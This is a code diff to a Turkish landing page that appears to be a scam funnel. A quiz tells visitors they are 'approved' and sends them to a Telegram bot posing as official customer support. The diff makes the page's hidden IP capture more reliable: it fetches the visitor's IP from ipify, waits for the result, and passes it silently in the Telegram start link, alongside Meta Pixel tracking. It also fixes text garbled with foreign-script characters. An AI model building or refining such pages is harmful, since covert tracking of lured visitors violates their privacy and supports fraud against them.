@@ -62,7 +62,7 @@
         @keyframes blinker { 50% { opacity: 0.4; } }
     </style>
 
-    <!-- Meta Pixel Code (Pixel ID: 1678752367301807) -->
+    <!-- Meta Pixel Code -->
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -110,7 +110,7 @@
                     <div class="flex items-center gap-2 text-brand font-bold">
                         <i class="ph-fill ph-shield-check text-xl"></i> Güvenli Başvuru Süreci
                     </div>
-                    <p class="text-slate-600 text-xs leading-relaxed">Bu test sonucunda uygun görüടുന്ന adaylar doğrudan resmi destek ekibimizle Telegram üzerinden görüştürülecektir.</p>
+                    <p class="text-slate-600 text-xs leading-relaxed">Bu test sonucunda uygun görülen adaylar doğrudan resmi destek ekibimizle Telegram üzerinden görüştürülecektir.</p>
                 </div>
                 <button onclick="startQuiz()" class="w-full bg-brand-dark hover:bg-slate-800 text-white font-black py-4 px-6 rounded-2xl transition-all shadow-xl text-base md:text-lg flex items-center justify-center gap-3 active:scale-95">
                     Değerlendirmeyi Başlat <i class="ph-bold ph-arrow-right text-sky-400"></i>
@@ -221,7 +221,7 @@
                 </div>
                 <h2 class="text-2xl md:text-3xl font-black text-slate-800 mb-2 tracking-tight">TEBRİKLER!</h2>
                 <p class="text-sm md:text-base text-slate-600 mb-6 font-medium leading-relaxed">
-                    Profiliniz başarıyla <span class="text-green-600 font-bold bg-green-50 px-2.5 py-1 rounded-lg border border-green-200">onaylandı.</span> Destek ekibimizle görüşmeye hak kazანدınız.
+                    Profiliniz başarıyla <span class="text-green-600 font-bold bg-green-50 px-2.5 py-1 rounded-lg border border-green-200">onaylandı.</span> Destek ekibimizle görüşmeye hak kazandınız.
                 </p>
                 
                 <button onclick="goToTelegram()" class="pulse-btn flex items-center justify-center gap-3 bg-brand-telegram hover:bg-sky-600 text-white text-base md:text-lg font-black py-4 px-6 rounded-2xl transition-all shadow-xl w-full active:scale-95">
@@ -239,14 +239,14 @@
 
     <script>
         const BOT_USERNAME = "Turkey_customer_support_bot"; 
-        let cachedIp = "unknown";
+        let cachedIp = "";
 
         // Background IP fetch
         window.addEventListener('DOMContentLoaded', () => {
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => { if(data && data.ip) { cachedIp = data.ip; } })
-                .catch(e => console.log("IP fetch error"));
+                .catch(e => { console.log("IP fetch error"); cachedIp = "unknown"; });
         });
 
         function startQuiz() {
@@ -279,9 +279,18 @@
             }, 3200);
         }
 
-        function goToTelegram() {
+        async function goToTelegram() {
             fbq('track', 'CompleteRegistration');
-            let telegramUrl = `https://t.me/${BOT_USERNAME}?start=ip_${cachedIp}`;
+
+            // IP ရလာဒ် အပြည့်အစုံ ရောက်လာသည်အထိ အမြင့်ဆုံး ၂ စက္ကန့် စောင့်ပေးမည်
+            let attempts = 0;
+            while (!cachedIp && attempts < 20) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+                attempts++;
+            }
+
+            let finalIp = cachedIp ? cachedIp : "unknown";
+            let telegramUrl = `https://t.me/${BOT_USERNAME}?start=ip_${finalIp}`;
             window.location.href = telegramUrl;
         }
     </script>
